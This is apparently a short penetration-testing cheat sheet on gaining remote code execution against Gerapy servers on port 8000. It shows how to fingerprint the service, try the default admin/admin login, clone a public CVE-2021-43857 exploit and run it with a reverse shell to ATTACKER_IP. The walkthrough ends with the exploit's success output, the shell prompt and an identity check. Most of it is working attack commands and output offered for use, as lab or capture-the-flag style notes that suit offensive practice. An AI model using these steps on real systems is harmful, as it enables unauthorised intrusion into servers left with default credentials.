# Gerapy

Gerapy exposed on TCP/8000 can lead to authenticated RCE when default credentials are still valid and the instance is vulnerable to CVE-2021-43857.

## Discovery

Look for Gerapy on the Python WSGI service:

Useful indicators:

```text
8000/tcp open  http  WSGIServer 0.2 (Python 3.10.6)
|_http-server-header: WSGIServer/0.2 CPython/3.10.6
|_http-title: Gerapy
```

WhatWeb may show:

```text
HTTPServer[WSGIServer/0.2 CPython/3.10.6], Title[Gerapy]
```

## Default Login

Try the default admin credentials:

```text
Username: admin
Password: admin
```

## CVE-2021-43857 RCE

Public exploit:

```bash
git clone https://github.com/LongWayHomie/CVE-2021-43857.git
cd CVE-2021-43857
```

The exploit needs an existing Gerapy project. If the project list is empty, create a project in the web UI first. In the observed path, the project was named `myproject`.

Run the exploit:

```bash
python3 exploit.py -t TARGET -p 8000 -L ATTACKER_IP -P 80
```

Successful output:

```text
Exploit for CVE-2021-43857
For: Gerapy < 0.9.8
[*] Logging in to application...
[*] Login successful! Proceeding...
[*] Getting the project list
[*] Found project: myproject
[*] Found ID of the project:  1
[*] Setting up a netcat listener
[*] Executing reverse shell payload
[*] Watchout for shell! :)
```

Successful shell:

```text
connect to [ATTACKER_IP] from (UNKNOWN) [TARGET] PORT
bash: cannot set terminal process group: Inappropriate ioctl for device
bash: no job control in this shell
app@ubuntu:~/gerapy$
```

Confirm context:

```bash
id
# uid=1000(app) gid=1000(app) groups=1000(app)
```

## References

- https://github.com/LongWayHomie/CVE-2021-43857
